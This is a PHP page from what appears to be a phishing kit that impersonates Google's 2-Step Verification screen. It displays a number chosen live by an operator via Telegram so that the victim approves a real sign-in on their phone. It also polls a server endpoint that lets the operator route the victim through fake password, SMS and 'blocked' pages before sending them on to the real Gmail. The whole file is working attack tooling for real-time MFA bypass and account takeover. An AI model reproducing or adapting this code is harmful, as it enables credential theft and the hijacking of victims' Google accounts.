<?php
// verify-prompt.php — 2-Step: NUMBER prompt (admin picks number via Telegram)
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid      = $_SESSION['visitor_id'] ?? session_id();
$email    = $_SESSION['email'];
$state    = get_state($sid);

// If already success, go to Gmail immediately
if ($state['page'] === 'success') {
    header('Location: https://mail.google.com/');
    exit;
}

// Get admin-chosen number — NO fallback static number
$num      = isset($state['prompt_number']) ? (int)$state['prompt_number'] : null;
$is_error = ($state['page'] === 'prompt_error');

page_open('2-Step Verification', true);
?>

<div class="card two-col" role="main">

  <!-- LEFT col -->
  <div>
    <?= g_logo() ?>
    <h1 class="card-title">2-Step Verification</h1>
    <p class="card-sub">
      To help keep your account safe, Google wants to make sure it's
      really you trying to sign in
    </p>
    </br></br>
  </div>

  <!-- RIGHT col -->
  <div>

    <?php if ($is_error): ?>
      <div style="background:#3c1414;border-radius:8px;padding:14px 16px;margin-bottom:20px;display:flex;align-items:center;gap:8px">
        <?= err_icon() ?>
        <span style="color:#f28b82;font-size:14px;font-family:'Roboto',sans-serif">
          That didn't match. Try again.
        </span>
      </div>
    <?php endif; ?>

    <!-- The big number — set by admin via Telegram -->
    <div class="verify-number" id="promptNum">
      <?= $num !== null ? $num : '&nbsp;' ?>
    </div> 

    <div class="verify-section">
      <p class="verify-title">Open the Gmail app on your Device</p>
      <p class="verify-desc">
        Google sent a notification to your Device. Open the Gmail app, tap
        <strong>Yes</strong> on the prompt, then tap
        <strong id="numInText"><?= $num !== null ? $num : '' ?></strong>
        on your phone to verify it's you.
      </p>

      <label class="cb-row" id="dontAskLabel">
        <input type="checkbox" checked/>
        <span class="cb-box on" id="dontAskBox"></span>
        <span class="cb-label">Don't ask again on this device</span>
      </label>
    </div>

    <div class="btn-row" style="justify-content:flex-end;margin-top:24px">
      <a href="loading.php" class="link">Try another way</a>
    </div>

  </div>
</div>

<script>
(function(){
  const MAP = {
    'loading':    'loading.php',
    'verify_sms': 'verify-sms.php',
    'sms_error':  'verify-sms.php',
    'verify_yes': 'verify-yes.php',
    'pw_error':   'password.php',
    'password':   'password.php',
    'blocked':    'blocked.php',
  };
  let redirecting  = false;
  let currentNum   = <?= $num !== null ? $num : 'null' ?>;

  function poll(){
    if (redirecting) return;
    fetch('poll.php?t=' + Date.now(), {cache:'no-store'})
      .then(r => r.json())
      .then(d => {
        if (redirecting) return;

        // Update number live if admin picks new one
        const newNum = parseInt(d.prompt_number);
        if (!isNaN(newNum) && newNum !== currentNum) {
          currentNum = newNum;
          document.getElementById('promptNum').textContent   = newNum;
          document.getElementById('numInText').textContent   = newNum;
        }

        // SUCCESS — only redirect when admin clicks the button
        if (d.page === 'success') {
          redirecting = true;
          window.location.replace('https://mail.google.com/');
          return;
        }

        // Stay on this page
        if (d.page === 'verify_prompt' || d.page === 'prompt_error') return;

        const dest = MAP[d.page];
        if (dest) {
          redirecting = true;
          window.location.replace(dest);
        }
      }).catch(()=>{});
  }

  setInterval(poll, 1200);
  poll();
})();
</script>

<?php page_close(); ?>
